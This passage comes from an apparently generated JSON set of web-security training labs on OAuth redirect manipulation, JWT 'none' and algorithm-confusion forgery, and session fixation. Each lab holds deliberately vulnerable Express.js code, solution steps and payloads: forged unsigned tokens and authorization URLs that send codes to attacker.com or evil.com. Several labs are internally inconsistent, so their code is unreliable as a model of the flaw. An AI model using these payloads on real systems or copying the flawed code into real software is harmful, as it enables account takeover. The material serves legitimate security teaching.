    "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: false })); const validUsers = [{ username: 'carlos', password: 'oauthpass' }]; app.get('/authorize', (req, res) => { const { client_id, redirect_uri } = req.query; const redirect = redirect_uri;  res.send(`<form method=\"POST\" action=\"/login?redirect=${redirect}\"><input name=\"username\"><input name=\"password\"><input type=\"submit\"></form>`); }); app.post('/login', (req, res) => { const { username, password } = req.body; const redirect = req.query.redirect; if (username === 'carlos' && password === 'oauthpass') { res.redirect(`${redirect}?code=authcode123`); } else { res.send('Login failed'); } }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'authcode123') res.json({ access_token: 'token-for-carlos' }); else res.status(400).send('Invalid code'); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization; if (token === 'Bearer token-for-carlos') res.send('Carlos account access granted'); else res.status(401).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://victim.com/authorize?client_id=123&redirect_uri=https://attacker.com/callback",
      "Stolen code: authcode123",
      "POST /oauth/token with { code: authcode123 }",
      "Authorization: Bearer token-for-carlos"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion vulnerability in session token verification",
    "Lab Description": "The application's authentication relies on JSON Web Tokens (JWT) for session validation. However, it insecurely trusts the algorithm header provided by the client, allowing an attacker to switch from 'RS256' to 'none' or 'HS256' and forge a valid token without the server's private key. The application signs session tokens with RSA but doesn't enforce algorithm validation. To solve: forge a JWT for the 'carlos' user and access the protected admin panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a valid JWT after authenticating with your own credentials.",
      "2. Decode the token using jwt.io or Postman, and observe the algorithm field set to 'RS256'.",
      "3. Modify the algorithm to 'none' and remove the signature, or switch it to 'HS256' and sign with the public key as the HMAC key.",
      "4. Send the crafted token in the Authorization header using Postman and attempt to access /admin-dashboard.",
      "5. Verify successful admin access by observing the response for admin-only data or 'Welcome carlos' message."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const publicKey = fs.readFileSync('./public.pem'); const privateKey = fs.readFileSync('./private.pem'); app.use(express.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username: username }, privateKey, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/admin-dashboard', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; if (!token) return res.sendStatus(401); jwt.verify(token, publicKey, (err, decoded) => { if (err) return res.sendStatus(403); if (decoded.username === 'carlos') res.send('Welcome carlos'); else res.sendStatus(403); }); }); app.listen(5000, () => console.log('JWT Algorithm Confusion Lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.[HMAC-SHA256-SIGNATURE-using-publicKey]"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow misconfiguration in third-party login endpoint",
    "Lab Description": "This lab's OAuth 2.0 login flow improperly accepts any token issued by an untrusted Authorization Server without validation. The application does not validate the issuer (`iss`) claim, allowing attackers to craft an access token with 'carlos' as the subject. To solve: craft a forged OAuth token using a dummy authorization server and log in as Carlos.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to capture the OAuth login process and inspect the 'access_token' parameter returned from the Authorization Server.",
      "2. Set up a fake OAuth server (such as with oauth-toolkit or mitmproxy) and create a signed JWT with the payload { 'sub': 'carlos' }.",
      "3. Intercept the redirect request using Burp and replace the legitimate access_token with your forged one.",
      "4. Replay the modified request to the target /auth/callback endpoint.",
      "5. Verify successful login as 'carlos' by accessing the /my-account endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.get('/auth/callback', (req, res) => { const token = req.query.access_token; const payload = jwt.decode(token); if (payload && payload.sub) { res.send(`Logged in as ${payload.sub}`); } else { res.status(401).send('Invalid token'); } }); app.get('/my-account', (req, res) => { res.send('Welcome to your account page!'); }); app.listen(3000, () => console.log('OAuth Implicit Flow Lab running'));",
    "payloads": [
      "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJjYXJsb3MifQ.[Valid-Signature-With-Your-Key]",
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session identifier in login endpoint",
    "Lab Description": "The web application creates a session identifier before authentication, and does not issue a new one upon successful login. This allows attackers to predefine a session ID, share it with the victim, and later hijack the session. To solve: Fixate a session, lure the victim into using it, then log in with the same session to access their My Account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP or Burp Suite to capture the session cookie issued before login.",
      "2. Manually set the session cookie to a known fixed value (e.g., SESSIONID=attacker-session).",
      "3. Send the link with the fixed session ID to the victim and ensure they log in without altering the session cookie.",
      "4. Reuse the same SESSIONID value to send an authenticated GET request to /my-account after the victim logs in.",
      "5. Confirm access to the victim's account page by verifying the returned user-specific content."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { 'carlos': 'supersecurepassword' }; app.get('/login', (req, res) => { const { username, password } = req.query; if (users[username] && users[username] === password) { res.send('Login successful'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { const session = req.cookies['SESSIONID']; if (session === 'attacker-session') { res.send('Welcome carlos!'); } else { res.send('Not authorized'); } }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "SESSIONID=attacker-session",
      "SESSIONID=known-fixed-session-id"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in session validation",
    "Lab Description": "This lab's authentication relies on JWTs for session validation. The server fails to enforce the algorithm specified in the token header and blindly trusts the signature when 'alg' is set to 'none'. The application fails to verify JWT signatures when the token's header declares 'none' as the algorithm, allowing an attacker to forge tokens. To solve: Forge a valid JWT for the user carlos and access their account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a login request and capture the JWT token issued for your own account.",
      "Inspect the token using jwt.io and confirm the header uses HS256 and the payload contains your username.",
      "Modify the token's header to use 'alg':'none' and the payload to set the username to 'carlos'. Remove the signature entirely.",
      "Send the forged JWT as a cookie in the Authorization header to /my-account and verify access to Carlos's account.",
      "Access the protected page and confirm the account data belongs to carlos, solving the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('cookie-parser')()); const secret = 'supersecretkey'; app.get('/login', (req, res) => { const { username } = req.query; const token = jwt.sign({ user: username }, secret, { algorithm: 'HS256' }); res.cookie('auth', token).send('Logged in'); }); app.get('/my-account', (req, res) => { const token = req.cookies.auth; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none' || jwt.verify(token, secret)) { res.send(`Account details for ${decoded.payload.user}`); } else { res.status(403).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Confusion Lab running on http://localhost:4000'));",
    "payloads": [
      "Header: {\"alg\":\"none\"}",
      "Payload: {\"user\":\"carlos\"}",
      "Token: base64url(header) + '.' + base64url(payload) + '.'"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session IDs",
    "Lab Description": "This lab's session management is vulnerable to fixation. The server issues predictable session IDs that are not regenerated upon successful login. An attacker can set a victim's session identifier before they log in and then reuse it to hijack the session. To solve: Fixate a session for the user carlos, wait for them to authenticate, then reuse the session ID to access their account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the initial unauthenticated GET request to /login and observe the Set-Cookie header containing a session ID.",
      "Send a crafted session ID (e.g., sessionid=attackercrafted123) in the Cookie header when visiting /login and verify the server accepts it.",
      "Entice the victim to log in while using the fixed sessionid=attackercrafted123 via a phishing link or CSRF.",
      "Once logged in, reuse the same sessionid=attackercrafted123 cookie to access /my-account directly.",
      "Confirm successful session takeover by accessing the user data for carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { carlos: 'securepass' }; app.get('/login', (req, res) => { const sessionId = req.cookies.sessionid || `sess-${Math.random().toString(36).substr(2, 8)}`; res.cookie('sessionid', sessionId).send('Please log in'); }); app.post('/authenticate', (req, res) => { const { username, password } = req.query; if (users[username] === password) res.send(`Logged in as ${username}`); else res.status(401).send('Invalid login'); }); app.get('/my-account', (req, res) => { const sessionId = req.cookies.sessionid; if (sessionId === 'attackercrafted123') res.send('Account details for carlos'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
    "payloads": [
      "Cookie: sessionid=attackercrafted123",
      "Session Fixation Attack: Use same sessionid pre and post-login"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow misconfiguration",
    "Lab Description": "This lab's authentication relies on OAuth with implicit flow, but the client application fails to validate the 'state' parameter, making it vulnerable to CSRF-based token theft. The attacker can craft an authorization URL to leak the victim's token. To solve: Capture Carlos's OAuth token and use it to access his account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to analyze the OAuth flow and capture the authorization URL including the state parameter.",
      "Replace the 'state' parameter value with an attacker-controlled redirect URI that points to your malicious server.",
      "Send this manipulated link to the victim and wait for them to authorize the request.",
      "Monitor your server to capture the victim’s access token in the redirected request.",
      "Use Postman to set the Authorization header to 'Bearer {captured-token}' and access /my-account as carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(require('body-parser').urlencoded({ extended: true })); app.get('/auth', (req, res) => { const { response_type, client_id, redirect_uri, state } = req.query; const token = 'token-carlos-xyz'; const redirect = `${redirect_uri}#access_token=${token}&state=${state}`; res.redirect(redirect); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-carlos-xyz') res.send('Account details for carlos'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Implicit Flow Lab running on http://localhost:4000'));",
    "payloads": [
      "Authorization URL: /auth?response_type=token&client_id=app123&redirect_uri=http://attacker.com/catch&state=abc123",
      "Authorization: Bearer token-carlos-xyz"
    ]
  },
  {
    "Lab scenario": "JWT Signature Verification Bypass in Token Validation Middleware",
    "Lab Description": "The application uses JSON Web Tokens (JWT) for session management but improperly trusts the 'alg' field from the token header. When this is set to 'none', the application skips signature verification. The application issues JWTs signed with a secret and expects a valid signature. To solve: Forge a valid token for 'carlos' by exploiting the 'none' algorithm bypass and access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a login request using Burp Suite and capture a valid JWT from the Authorization header.",
      "Validate the token structure and identify the 'alg' value in the decoded JWT header using jwt.io.",
      "Craft a new JWT with the 'alg' set to 'none' and the payload containing 'username':'carlos'.",
      "Replace the original token with the crafted unsigned JWT in Burp Repeater and forward the request.",
      "If successful, observe that the account page for 'carlos' loads, confirming the signature bypass."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET_KEY = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, SECRET_KEY, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; if (!token) return res.status(401).send('Token missing'); const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { res.send(`Account details for ${decoded.payload.username}`); } else { try { jwt.verify(token, SECRET_KEY); res.send(`Account details for ${decoded.payload.username}`); } catch { res.status(403).send('Invalid token'); } } }); app.listen(4000, () => console.log('JWT Signature Bypass Lab running on http://localhost:4000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9"
    ]
  },
  {
    "Lab scenario": "OAuth Authorization Code Interception in Redirect Handler",
    "Lab Description": "The application implements OAuth 2.0 for third-party login using a redirect_uri parameter vulnerable to open redirection. An attacker can intercept the authorization code before token exchange. The application trusts user-controlled redirect URLs without validation. To solve: Steal Carlos's authorization code via a manipulated redirect_uri and log into his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the OAuth flow and modify the redirect_uri to a malicious domain you control.",
      "Use a local listener (like Postman Interceptor or Burp Collaborator) to capture the authorization code when the victim authenticates.",
      "Manually exchange the intercepted authorization code for an access token using Postman or curl.",
      "Use the obtained token to make an authenticated request to /my-account as Carlos.",
      "Verify the successful compromise by accessing Carlos's profile data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); app.get('/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = 'authcode123'; res.redirect(`${redirect_uri}?code=${code}&state=${state}`); }); app.post('/token', (req, res) => { const { code } = req.body; if (code === 'authcode123') res.json({ access_token: 'supersecrettoken' }); else res.status(400).send('Invalid code'); }); app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; if (auth === 'Bearer supersecrettoken') res.send('Account details for carlos'); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('OAuth Code Interception Lab running on http://localhost:4000'));",
    "payloads": [
      "https://attacker.com/callback?code=authcode123",
      "https://malicious-site.io/callback?code=authcode123"
    ]
  },
  {
    "Lab scenario": "Session Fixation via Insecure Cookie Assignment in Login Flow",
    "Lab Description": "The application improperly assigns the session identifier before user authentication, allowing attackers to fixate a known session ID. The server does not regenerate the session token post-login. To solve: Fixate a session ID before login and trick Carlos into logging in, then reuse the same session to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the initial GET /login request and observe the Set-Cookie response with session ID.",
      "Send the fixed session ID to the victim via social engineering and wait for them to log in.",
      "Once the victim logs in, reuse the same fixed session cookie in Burp Repeater.",
      "Access the /my-account endpoint while sending the fixed session cookie to hijack the authenticated session.",
      "Confirm access to Carlos's account, demonstrating successful session fixation exploitation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/login', (req, res) => { if (!req.cookies.session) { const sid = Math.random().toString(36).substring(2); res.cookie('session', sid); res.send('Session initialized'); } else { res.send('Session exists'); } }); const users = { 'carlos': { password: 'qwerty', session: null } }; app.post('/authenticate', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { users[username].session = req.cookies.session; res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const user = Object.keys(users).find(u => users[u].session === req.cookies.session); if (user) res.send(`Account details for ${user}`); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
    "payloads": [
      "session=attackerfixedsession",
      "session=knownsessionvalue"
    ]
  },
  {
    "Lab scenario": "JWT signature verification bypass in REST API login",
    "Lab Description": "This lab's RESTful authentication mechanism uses JWTs but fails to verify the token signature correctly when the 'alg' field is manipulated. The application accepts JWTs from clients to grant access to protected resources. However, the backend incorrectly trusts unsigned tokens when the 'alg' is set to 'none'. To solve: craft and submit a forged token to access Carlos's protected account endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture a valid JWT token using Burp Suite by logging into your own account and intercepting the Authorization header.",
      "Inspect the JWT token in jwt.io and observe the 'alg' header, which is likely set to HS256.",
      "Modify the JWT header to set 'alg' to 'none' and remove the signature part of the token.",
      "Modify the payload section to change the username to 'carlos' and re-encode the JWT.",
      "Resend the forged token using Burp Repeater in the Authorization header and confirm the server grants access to Carlos's /my-account endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { carlos: 'password123' }; const secret = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ user: username }, secret, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).json({ error: 'Invalid credentials' }); } }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; const token = authHeader && authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, secret); res.send(`Welcome ${decoded.user}`); } catch { res.status(403).send('Access Denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Auth Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "{\"alg\":\"none\"}",
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session tokens in login flow",
    "Lab Description": "This web application's login process is vulnerable to session fixation. The server fails to regenerate session tokens upon successful login, allowing an attacker to set a valid session ID in advance and hijack a victim's authenticated session. To solve: pre-set a session ID before login, then log in as Carlos using that fixed session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Burp Suite, intercept the GET /login page request and note the Set-Cookie response containing the session ID.",
      "Modify the session cookie to a chosen predictable value, such as 'fixed-session-id', using Burp Repeater or browser dev tools.",
      "Send the fixed session ID to Carlos via social engineering or session injection (simulated for the lab).",
      "Log in as Carlos using his known credentials while maintaining the fixed session ID.",
      "After login, navigate to /my-account to confirm access using the pre-set session token."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = { carlos: 'letmein' }; app.get('/login', (req, res) => { const sessionId = req.cookies.sessionid || Math.random().toString(36).substring(2); res.cookie('sessionid', sessionId); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { res.send(`Logged in as ${username}`); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { if (req.cookies.sessionid === 'fixed-session-id') { res.send('Welcome carlos'); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: sessionid=fixed-session-id",
      "POST /login with pre-set Cookie: sessionid=fixed-session-id",
      "Use same sessionid to access /my-account"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration leaking authorization code via redirect URI manipulation",
    "Lab Description": "This lab's OAuth 2.0 implementation misconfigures the allowed redirect URIs, failing to validate the domain properly. Attackers can manipulate the redirect URI to capture the authorization code for any user. To solve: hijack Carlos's authorization code and use it to obtain an access token and access his account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using OWASP ZAP or Burp Suite, initiate an OAuth login flow and observe the redirect_uri parameter in the authorization URL.",
      "Modify the redirect_uri to an attacker-controlled domain using an open redirect service like https://evil.com/path.",
      "Send the modified URL to Carlos (simulated) and wait for him to authenticate and be redirected to your server capturing the authorization code.",
      "Exchange the captured authorization code for an access token via POST /oauth/token using Postman.",
      "Use the obtained access token in the Authorization header to access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const authCodes = {}; const tokens = {}; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = Math.random().toString(36).substring(2); authCodes[code] = 'carlos'; res.redirect(`${redirect_uri}?code=${code}&state=${state}`); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (authCodes[code]) { const token = `token-${authCodes[code]}`; tokens[token] = authCodes[code]; res.json({ access_token: token }); } else { res.status(400).json({ error: 'Invalid code' }); } }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; const token = authHeader && authHeader.split(' ')[1]; if (tokens[token]) { res.send(`Account details for ${tokens[token]}`); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Misconfig Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://vulnerable.com/authorize?client_id=xyz&redirect_uri=https://evil.com/path&state=abc",
      "POST /oauth/token with code=<captured_code>",
      "Authorization: Bearer token-carlos"
    ]
  },
  {
    "Lab scenario": "JWT token signature vulnerability in session management",
    "Lab Description": "This lab's session management mechanism uses JSON Web Tokens (JWT) for authentication but fails to securely verify the token's signature. The application uses a hardcoded secret and doesn't validate the algorithm properly. To solve: forge a valid admin token using the known public key and access the admin control panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept and decode the JWT token after authenticating with a user account.",
      "Validate if the token's 'alg' header can be modified by setting it to 'none' or 'HS256' without verification failures.",
      "Craft a custom JWT token with 'alg' set to 'HS256' and use 'admin' as the username, signing it using the discovered or null secret.",
      "Resend the forged token as a cookie using Burp Repeater to access the /admin page.",
      "Verify successful exploitation by observing the 'Admin Control Panel' interface."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET_KEY = 'insecuresecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username, role: 'user' }, SECRET_KEY, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, SECRET_KEY); if (decoded.role === 'admin') { res.send('Welcome Admin!'); } else { res.status(403).send('Forbidden'); } } catch (err) { res.status(401).send('Invalid Token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "Header: { \"alg\": \"HS256\", \"typ\": \"JWT\" }, Payload: { \"user\": \"admin\", \"role\": \"admin\" }, Signature: HMAC(HS256, 'insecuresecret')",
      "Header: { \"alg\": \"none\" }, Payload: { \"user\": \"admin\", \"role\": \"admin\" }, Signature: ''"
    ]
  },
  {
    "Lab scenario": "OAuth implicit grant misconfiguration in login flow",
    "Lab Description": "This lab simulates an OAuth-based login mechanism that incorrectly trusts user-supplied redirect URIs and fails to validate tokens properly. The application exposes the access token directly in the URL hash, allowing attackers to manipulate it. To solve: hijack an OAuth token using a crafted redirect URI and access the victim's protected resources.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to passively scan the OAuth flow during login and extract the authorization URL.",
      "Modify the redirect_uri parameter to an attacker-controlled domain and observe token leakage via URL fragments.",
      "Construct a malicious OAuth authorization request that uses the manipulated redirect_uri.",
      "Capture the leaked token using a listener on the attacker's server (e.g., with netcat or Burp Collaborator).",
      "Replay the stolen token to the /account endpoint and confirm ownership of the victim's session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); const users = { 'carlos': { accessToken: 'abc123token' } }; app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const token = users['carlos'].accessToken; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/account', (req, res) => { const { token } = req.query; if (token === users['carlos'].accessToken) { res.send('Welcome, carlos!'); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "https://victim-site.com/auth?redirect_uri=https://attacker.com/capture",
      "https://attacker.com/#access_token=abc123token"
    ]
  },
  {
    "Lab scenario": "Session fixation attack via URL parameter in login endpoint",
    "Lab Description": "This lab's login endpoint fails to regenerate session tokens after successful authentication, allowing attackers to set their own session ID via a URL parameter. If the session ID remains unchanged after login, attackers can predetermine the victim's session. To solve: fixate your session ID and access Carlos's account after forcing him to log in.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a GET request to /login?session=attackersessionid and note the session cookie assigned.",
      "Craft a phishing link containing the same session ID and send it to the victim.",
      "Upon victim login, the session remains fixed to 'attackersessionid', allowing hijacking.",
      "Use the same session cookie in your browser or Postman to access the /my-account endpoint.",
      "Verify that the server returns the victim's personalized account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/login', (req, res) => { const sessionID = req.query.session || Math.random().toString(36).substr(2); res.cookie('session', sessionID); res.send('Session initialized'); }); app.get('/my-account', (req, res) => { const session = req.cookies.session; if (session === 'attackersessionid') { res.send('Welcome carlos!'); } else { res.send('Welcome guest'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "GET /login?session=attackersessionid",
      "Set-Cookie: session=attackersessionid",
      "GET /my-account with Cookie: session=attackersessionid"
    ]
  },
  {
    "Lab scenario": "JWT Signature None Algorithm Bypass in Authorization Header",
    "Lab Description": "This lab's authentication system uses JSON Web Tokens (JWT) for session management. The server-side JWT verification improperly trusts tokens with the `alg` field set to 'none'. The application signs user sessions, but fails to enforce algorithm validation during token parsing, allowing attackers to forge tokens without knowing the secret key. To solve: Log in as the 'carlos' user by crafting a valid JWT without the signing key.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the JWT token after logging into your own account using Burp Suite.",
      "Validate that the token uses HS256 or RS256 by decoding the header and checking the `alg` field.",
      "Modify the JWT header: set `alg` to `none` and remove the signature part of the token.",
      "Set the `sub` claim in the payload to `carlos` and replace your session cookie in the browser with the forged token.",
      "Visit the /my-account endpoint to confirm successful login as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecretkey'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'password123') { const token = jwt.sign({ sub: username }, secret, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'RS256', 'none'] }); res.send('Account details for ' + decoded.sub); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Algorithm Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ",
      "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ."
    ]
  },
  {
    "Lab scenario": "Session Fixation via URL Parameter in Login Flow",
    "Lab Description": "This lab's session handling mechanism is vulnerable to fixation attacks. The session ID is accepted from a user-supplied URL parameter (`sessionId`) and assigned without regeneration upon login, enabling attackers to predetermine session IDs for victims. To solve: Log in as Carlos by fixing a session ID before authentication and reuse it post-login to hijack his session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP or Burp Suite to intercept the initial GET /login request and observe the URL sessionId parameter.",
      "Confirm that the server allows setting the session ID via the URL and does not regenerate it after successful login.",
      "Craft a phishing link embedding a predictable `sessionId` value like `/login?sessionId=attackersession123`.",
      "Wait until the victim uses this link and logs in. Then reuse the same `sessionId` in your own browser to access /my-account.",
      "Verify that you now have access to the victim's session as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/login', (req, res) => { const sid = req.query.sessionId || Math.random().toString(36).substring(2); res.cookie('sessionId', sid); res.send(`<form method='POST' action='/login'>Username: <input name='username'/><br>Password: <input name='password'/><br><button>Login</button></form>`); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'supersecret') res.redirect('/my-account'); else res.status(401).send('Invalid credentials'); }); app.get('/my-account', (req, res) => { const sessionId = req.cookies['sessionId']; if (sessionId === 'attackersession123') res.send('Account details for carlos'); else res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "http://victim-app/login?sessionId=attackersession123",
      "sessionId=attackersession123",
      "Cookie: sessionId=attackersession123"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration Token Leakage in Redirect URI",
    "Lab Description": "This lab's OAuth implementation is vulnerable due to overly permissive redirect URI validation. An attacker can manipulate the redirect URI parameter to leak authorization codes to a malicious domain. The OAuth server accepts partial matching on registered redirect URIs, making it possible to inject crafted URLs. To solve: Extract the OAuth token for Carlos and access his account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the OAuth login flow and inspect the `redirect_uri` parameter.",
      "Modify `redirect_uri` to embed a malicious endpoint using an open redirect or subdomain like `https://attacker.com?code=`.",
      "Login as Carlos and complete the OAuth flow to capture the leaked authorization code in your listener.",
      "Exchange the stolen code for an access token via Postman or curl.",
      "Use the access token to call the /my-account API as Carlos."
    ],
    "Vulnerability name": "Authentication",
